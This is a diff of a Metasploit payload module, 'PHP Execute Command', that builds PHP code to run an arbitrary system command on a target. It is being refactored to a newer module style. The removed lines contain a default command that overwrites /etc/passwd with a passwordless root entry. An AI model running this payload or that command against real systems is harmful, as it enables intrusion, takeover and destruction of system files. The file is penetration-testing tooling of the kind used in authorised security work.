@@ -1,60 +1,49 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+module MetasploitModule
+  CachedSize = :dynamic
 
+  include Msf::Payload::Single
+  include Msf::Payload::Php
 
-require 'msf/core'
-require 'msf/core/payload/php'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Execute Command ',
+        'Description' => 'Execute a single system command',
+        'Author' => [ 'egypt' ],
+        'License' => BSD_LICENSE,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP
+      )
+    )
+    register_options(
+      [
+        OptString.new('CMD', [ true, 'The command string to execute' ]),
+      ]
+    )
+  end
 
+  def php_exec_cmd
+    # please do not copy me into new code, instead use the #php_exec_cmd method after including Msf::Payload::Php or
+    # use the PHP adapter payload by selecting any php/unix/cmd/* payload
+    vars = Rex::RandomIdentifier::Generator.new(language: :php)
+    shell = <<-END_OF_PHP_CODE
+      #{php_preamble(vars_generator: vars)}
+      #{php_system_block(vars_generator: vars, cmd: datastore['CMD'])}
+    END_OF_PHP_CODE
 
-module Metasploit3
+    Rex::Text.compress(shell)
+  end
 
-	include Msf::Payload::Single
-	include Msf::Payload::Php
-
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'PHP Execute Command ',
-			'Version'       => '$Revision$',
-			'Description'   => 'Execute a single system command',
-			'Author'        => [ 'egypt' ],
-			'License'       => BSD_LICENSE,
-			'Platform'      => 'php',
-			'Arch'          => ARCH_PHP
-			))
-		register_options(
-			[
-				OptString.new('CMD', [ true, "The command string to execute", 'echo "toor::0:0:::/bin/bash">/etc/passwd' ]),
-			], self.class)
-	end
-
-	def php_exec_cmd
-
-		cmd = Rex::Text.encode_base64(datastore['CMD'])
-		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-		shell = <<-END_OF_PHP_CODE
-		$c = base64_decode("#{cmd}");
-		#{php_preamble({:disabled_varname => dis})}
-		#{php_system_block({:cmd_varname=>"$c", :disabled_varname => dis})}
-		END_OF_PHP_CODE
-
-		return Rex::Text.compress(shell)
-	end
-
-	#
-	# Constructs the payload
-	#
-	def generate
-		return php_exec_cmd
-	end
-
+  #
+  # Constructs the payload
+  #
+  def generate(_opts = {})
+    return php_exec_cmd
+  end
 end
